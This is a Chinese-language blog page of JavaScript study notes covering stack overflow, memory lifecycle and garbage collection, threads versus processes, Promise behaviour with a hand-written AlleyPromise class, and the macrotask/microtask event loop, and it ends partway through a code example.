<p>函数递归调用，会出现压栈的行为，并不会弹出直到递归停止，当到达一定程度的数量，栈容器就会存在不够存放的情况，这种就叫栈溢出。<br><strong>如何解决栈溢出？</strong></p>
<ol>
<li>利用异步任务优化（宏任务&#x2F;微任务）</li>
<li>尾调用优化</li>
</ol>
<h2 id="内存的生命周期"><a href="#内存的生命周期" class="headerlink" title="内存的生命周期"></a>内存的生命周期</h2><p>JS 环境中分配的内存一般有如下生命周期：</p>
<ol>
<li><p>_内存分配_：当我们申明变量、函数、对象的时候，系统会自动为他 们分配内存</p>
</li>
<li><p>_内存使用_：即读写内存，也就是使用变量、函数等</p>
</li>
<li><p>_内存回收_：使用完毕，由垃圾回收机制自动回收不再使用的内存</p>
</li>
</ol>
<p>为了便于理解，我们使用一个简单的例子来解释这个周期。</p>
<p>var a &#x3D; 20; &#x2F;&#x2F; 在内存中给数值变量分配空间</p>
<p>alert(a + 100); &#x2F;&#x2F; 使用内存</p>
<p>var a &#x3D; null; &#x2F;&#x2F; 使用完毕之后，释放内存空间</p>
<h2 id="内存回收"><a href="#内存回收" class="headerlink" title="内存回收"></a>内存回收</h2><p>在局部作用域中，当函数执行完毕，局部变量也就没有存在的必要了，因此垃圾收集器很容易做出判断并回收。但是全局变量什么时候需要自动释放内存空间则很难判断，因此在我们的开发中，需要尽量避免使用全局变量，以确保性能问题。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fun1</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">var</span> obj = &#123;<span class="attr">name</span>: <span class="string">&#x27;csa&#x27;</span>, <span class="attr">age</span>: <span class="number">24</span>&#125;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fun2</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">var</span> obj = &#123;<span class="attr">name</span>: <span class="string">&#x27;coder&#x27;</span>, <span class="attr">age</span>: <span class="number">2</span>&#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> obj;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f1 = <span class="title function_">fun1</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f2 = <span class="title function_">fun2</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在上述代码中，当执行<code>var f1 = fun1();</code>的时候，执行环境会创建一个<code>&#123;name:&#39;csa&#39;, age:24&#125;</code>这个对象，</p>
<p>当执行<code>var f2 = fun2();</code>的时候，执行环境会创建一个<code>&#123;name:&#39;coder&#39;, age=2&#125;</code>这个对象</p>
<p>然后在下一次垃圾回收来临的时候，会释放<code>&#123;name:&#39;csa&#39;, age:24&#125;</code>这个对象的内存，但并不会释放<code>&#123;name:&#39;coder&#39;, age:2&#125;</code>这个对象的内存。</p>
<p>这就是因为在<code>fun2()</code>函数中将<code>&#123;name:&#39;coder, age:2&#39;&#125;</code>这个对象返回，并且将其引用赋值给了 f<code>2</code>变量，又由于<code>f2</code>这个对象属于全局变量，所以在页面没有卸载的情况下，<code>f2</code>所指向的对象<code>&#123;name:&#39;coder&#39;, age:2&#125;</code>是不会被回收的。</p>
<h2 id="标记清除算法"><a href="#标记清除算法" class="headerlink" title="标记清除算法"></a>标记清除算法</h2><p>标记清除算法将“不再使用的对象”定义为“无法达到的对象”。简单来说，就是从根部（在 JS 中就是全局对象）出发定时扫描内存中的对象。凡是能从根部到达的对象，都是还需要使用的。那些无法由根部出发触及到的对象被标记为不再使用，稍后进行回收。</p>
<h1 id="线程-VS-进程"><a href="#线程-VS-进程" class="headerlink" title="线程 VS 进程"></a>线程 VS 进程</h1><p>线程：多线程可以并行处理，但是<strong>线程是不能单独存在的，它是由进程来启动和管理的</strong>。<br>进程：<strong>一个进程就是一个程序的运行实例</strong>。详细的解释：启动一个程序的时候，操作系统回味该程序创建一块内存，用来存放代码、运行中的数据和一个执行任务的主线程</p>
<p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-11-30%20221332.png" alt="屏幕截图 2021-11-30 221332"></p>
<p>从图中可以看出<strong>线程依附于进程的，而进程中使用多线程并行处理能提升运算效率</strong></p>
<h2 id="进程和线程关系"><a href="#进程和线程关系" class="headerlink" title="进程和线程关系"></a>进程和线程关系</h2><ol>
<li>进程中的任意一线程执行出错，都会导致整个进程的崩溃</li>
<li>线程之间共享进程中的数据</li>
<li>当一个进程关闭之后，操作系统会回收进程所占用的内存</li>
<li>进程之间的内容相互隔离，进行通讯需要使用用于进程通信（IPC）的机制了</li>
</ol>
<h1 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h1><h2 id="解决了什么问题"><a href="#解决了什么问题" class="headerlink" title="解决了什么问题"></a>解决了什么问题</h2><p><strong><code>promise</code>解决的是<code>异步编码风格</code>的问题</strong></p>
<ol>
<li>异步编程的问题： 代码逻辑不连续</li>
</ol>
<h2 id="状态和方法"><a href="#状态和方法" class="headerlink" title="状态和方法"></a>状态和方法</h2><ol>
<li><strong>有几种状态</strong></li>
</ol>
<ul>
<li>pending</li>
<li>fulfilled</li>
<li>rejected</li>
</ul>
<ol start="2">
<li><strong>状态是否可变</strong><br>状态不可变，resolve 之后不可 rejected，反之也是</li>
<li><strong>有哪些方法，应用场景</strong></li>
</ol>
<ul>
<li>then</li>
<li>race</li>
<li>all</li>
<li>catch</li>
<li>reject</li>
<li>allsettled</li>
<li>any</li>
</ul>
<ol>
<li><p><strong>async&#x2F;await</strong></p>
</li>
<li><p><strong>catch 的捕获机制</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">executor</span>(<span class="params">resolve, reject</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> rand = <span class="title class_">Math</span>.<span class="title function_">random</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(rand)</span><br><span class="line">    <span class="keyword">if</span> (rand &gt; <span class="number">0.5</span>)</span><br><span class="line">        <span class="title function_">resolve</span>()</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="title function_">reject</span>()</span><br><span class="line">&#125;<span class="keyword">var</span> p0 = <span class="keyword">new</span> <span class="title class_">Promise</span>(executor);</span><br><span class="line"><span class="keyword">var</span> p1 = p0.<span class="title function_">then</span>(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;succeed-1&quot;</span>) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(executor)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">var</span> p3 = p1.<span class="title function_">then</span>(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;succeed-2&quot;</span>) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(executor)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">var</span> p4 = p3.<span class="title function_">then</span>(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;succeed-3&quot;</span>) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(executor)</span><br><span class="line">&#125;)</span><br><span class="line">p4.<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;error&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>当第一个出错时。p4 仍可以捕获到错误。这样就解决了每个任务都需要单独处理异常的问题</p>
</li>
</ol>
<p>​ <a target="_blank" rel="noopener" href="https://juejin.cn/post/6945319439772434469">https://juejin.cn/post/6945319439772434469</a></p>
<ol start="3">
<li></li>
</ol>
<p><strong>​ 思考</strong></p>
<ol>
<li><p><strong>Promise 中为什么要引入微任务？</strong></p>
</li>
<li><p><strong>Promise 中是如何实现回调函数返回值穿透的？</strong></p>
</li>
<li><p><strong>Promise 出错后，是怎么通过“冒泡”传递给最后那个捕获异常的函数？</strong></p>
<p>promise 部分实现</p>
</li>
</ol>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AlleyPromise</span> &#123;</span><br><span class="line">  <span class="comment">// 1、Promise三种状态</span></span><br><span class="line">  <span class="keyword">static</span> <span class="variable constant_">PENDING</span> = <span class="string">&quot;PENDING&quot;</span>;</span><br><span class="line">  <span class="keyword">static</span> <span class="variable constant_">FULFILED</span> = <span class="string">&quot;FULFILED&quot;</span>;</span><br><span class="line">  <span class="keyword">static</span> <span class="variable constant_">REJECTED</span> = <span class="string">&quot;REJECTED&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">callback</span>) &#123;</span><br><span class="line">    <span class="comment">// 容错处理</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> callback !== <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TypeError</span>(<span class="string">&quot;Promise resolver undefined is not a function&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始状态</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">promiseStatus</span> = <span class="title class_">AlleyPromise</span>.<span class="property">PENDING</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义resolve函数队列 reject函数队列</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">resolveQueues</span> = [];</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">rejectQueues</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义初始值</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">value</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用callback函数</span></span><br><span class="line">    <span class="title function_">callback</span>(<span class="variable language_">this</span>.<span class="property">_resolve</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>), <span class="variable language_">this</span>.<span class="property">_reject</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">_resolve</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="title function_">queueMicrotask</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// 更改成功状态</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">promiseStatus</span> !== <span class="title class_">AlleyPromise</span>.<span class="property">PENDING</span>) <span class="keyword">return</span>;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">promiseStatus</span> = <span class="title class_">AlleyPromise</span>.<span class="property">FULFILED</span>;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">value</span> = val;</span><br><span class="line">      <span class="keyword">let</span> handler;</span><br><span class="line">      <span class="keyword">while</span> ((handler = <span class="variable language_">this</span>.<span class="property">resolveQueues</span>.<span class="title function_">shift</span>())) &#123;</span><br><span class="line">        <span class="title function_">handler</span>(<span class="variable language_">this</span>.<span class="property">value</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">_reject</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="title function_">queueMicrotask</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// 更改失败状态</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">promiseStatus</span> !== <span class="title class_">AlleyPromise</span>.<span class="property">PENDING</span>) <span class="keyword">return</span>;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">promiseStatus</span> = <span class="title class_">AlleyPromise</span>.<span class="property">REJECTED</span>;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">value</span> = val;</span><br><span class="line">      <span class="keyword">let</span> handler;</span><br><span class="line">      <span class="keyword">while</span> ((handler = <span class="variable language_">this</span>.<span class="property">rejectQueues</span>.<span class="title function_">shift</span>())) &#123;</span><br><span class="line">        <span class="title function_">handler</span>(<span class="variable language_">this</span>.<span class="property">value</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">then</span>(<span class="params">resolveHandler, rejectHandler</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AlleyPromise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">function</span> <span class="title function_">newResolveHandler</span>(<span class="params">val</span>) &#123;</span><br><span class="line">        <span class="comment">// 首先判断 resolveHandler是否是一个函数</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> resolveHandler === <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">                获取resolveHandler 函数的返回值进行判断</span></span><br><span class="line"><span class="comment">                如果是promise则继续.then，不是则直接将结果返回</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">          <span class="keyword">let</span> result = <span class="title function_">resolveHandler</span>(val);</span><br><span class="line">          <span class="keyword">if</span> (result <span class="keyword">instanceof</span> <span class="title class_">AlleyPromise</span>) &#123;</span><br><span class="line">            result.<span class="title function_">then</span>(resolve, reject);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_">resolve</span>(result);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="title function_">resolve</span>(val);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">function</span> <span class="title function_">newRejectHandler</span>(<span class="params">val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> rejectHandler === <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">          <span class="keyword">let</span> result = <span class="title function_">rejectHandler</span>(val);</span><br><span class="line">          <span class="keyword">if</span> (result <span class="keyword">instanceof</span> <span class="title class_">AlleyPromise</span>) &#123;</span><br><span class="line">            result.<span class="title function_">then</span>(resolve, reject);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_">reject</span>(result);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="title function_">reject</span>(val);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">resolveQueues</span>.<span class="title function_">push</span>(newResolveHandler);</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">rejectQueues</span>.<span class="title function_">push</span>(newRejectHandler);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">catch</span>(rejectHandler) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">then</span>(<span class="literal">undefined</span>, rejectHandler);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">static</span> <span class="title function_">all</span>(<span class="params">iterator</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> len = iterator.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">let</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> vals = [];</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AlleyPromise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      iterator.<span class="title function_">forEach</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">        item</span><br><span class="line">          .<span class="title function_">then</span>(<span class="function">(<span class="params">val</span>) =&gt;</span> &#123;</span><br><span class="line">            ++n;</span><br><span class="line">            vals.<span class="title function_">push</span>(val);</span><br><span class="line">            <span class="keyword">if</span> (len === n) &#123;</span><br><span class="line">              <span class="title function_">resolve</span>(vals);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;)</span><br><span class="line">          .<span class="title function_">catch</span>(<span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">reject</span>(e);</span><br><span class="line">          &#125;);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">static</span> <span class="title function_">race</span>(<span class="params">iterator</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AlleyPromise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      iterator.<span class="title function_">forEach</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">        item</span><br><span class="line">          .<span class="title function_">then</span>(<span class="function">(<span class="params">val</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">resolve</span>(val);</span><br><span class="line">          &#125;)</span><br><span class="line">          .<span class="title function_">catch</span>(<span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">reject</span>(e);</span><br><span class="line">          &#125;);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">static</span> <span class="title function_">resolve</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AlleyPromise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">resolve</span>(val);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">static</span> <span class="title function_">reject</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AlleyPromise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">reject</span>(val);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> promise1 = <span class="keyword">new</span> <span class="title class_">AlleyPromise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">//   reject(1213);</span></span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">resolve</span>();</span><br><span class="line">  &#125;, <span class="number">2001</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// promise1</span></span><br><span class="line"><span class="comment">//   .then((res) =&gt; &#123;</span></span><br><span class="line"><span class="comment">//     return MyPromise.resolve(&quot;valu23e&quot;);</span></span><br><span class="line"><span class="comment">//   &#125;)</span></span><br><span class="line"><span class="comment">//   .then((res) =&gt; &#123;</span></span><br><span class="line"><span class="comment">//     console.log(res);</span></span><br><span class="line"><span class="comment">//   &#125;);</span></span><br><span class="line">promise1</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> <span class="number">123</span>)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> <span class="keyword">new</span> <span class="title class_">AlleyPromise</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> <span class="title function_">res</span>(<span class="number">12</span>)))</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">23</span>, res);</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  .<span class="title function_">catch</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">23</span>, res);</span><br><span class="line">  &#125;);</span><br><span class="line">a;</span><br></pre></td></tr></table></figure>

<h1 id="宏任务和微任务"><a href="#宏任务和微任务" class="headerlink" title="宏任务和微任务"></a>宏任务和微任务</h1><ol>
<li><strong>宏任务</strong></li>
</ol>
<ul>
<li>渲染事件（解析 DOM、计算布局、绘制）</li>
<li>用户交互事件（鼠标点击、滚动页面）</li>
<li>js 脚本执行事件</li>
<li>网络请求完成事件</li>
</ul>
<p><strong>为了协调这些任务在主线程上稳定执行，引入了消息队列和事件循环机制，<code>消息队列中</code>的任务，就称为<code>宏任务</code>，<code>消息队列</code>中的任务是通过事件循环系统执行的</strong></p>
<ol start="2">
<li><strong>微任务</strong></li>
</ol>
<ul>
<li><p><code>MutationObserver</code>监控某 DOM 节点，通过 js 操作节点，节点发生变化，产生记录 DOM 变化的微任务</p>
</li>
<li><p>使用<code>Promise</code>，调用<code>Promise.resolve()</code>或者<code>Promise.reject()</code>产生微任务</p>
</li>
</ul>
<p>执行脚本时，在宏任务执行过程中有时候会产生很多微任务，引擎会创建一个微任务队列，来存放微任务<br><strong>微任务执行时机：</strong><br><strong>当前宏任务执行完成时，清空栈时，引擎检查微任务队列，按顺序执行队列中的任务</strong><br><strong>如果微任务队列执行中产生新的微任务，同样的会加到同个微任务队列中，循环执行。并不会推迟到下个宏任务中执行</strong></p>
<p><strong>结论：</strong></p>
<ul>
<li><p>微任务和宏任务时绑定的，每个宏任务在执行时会创建自己的微任务队列。</p>
</li>
<li><p>微任务时长会影响到当前宏任务的时长</p>
</li>
<li><p>在一个宏任务中，分别创建一个用于回调的宏任务和微任务，无论什么情况，微任务都早于宏任务。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params">cb</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;谁先执行呢&quot;</span>);</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;setTimeout执行&quot;</span>);</span><br><span class="line">    <span class="title function_">cb</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">resolve</span>();</span><br><span class="line">  &#125;).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Promise执行&quot;</span>);</span><br><span class="line">    <span class="title function_">cb</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">fn</span>(<span class="function">() =&gt;</span> &#123;&#125;);</span><br><span class="line"><span class="comment">// 谁先执行呢</span></span><br><span class="line"><span class="comment">// Promise执行</span></span><br><span class="line"><span class="comment">// setTimeout执行</span></span><br></pre></td></tr></table></figure></li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">executor</span>(<span class="params">resolve, reject</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> rand = <span class="title class_">Math</span>.<span class="title function_">random</span>();</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(rand);</span><br><span 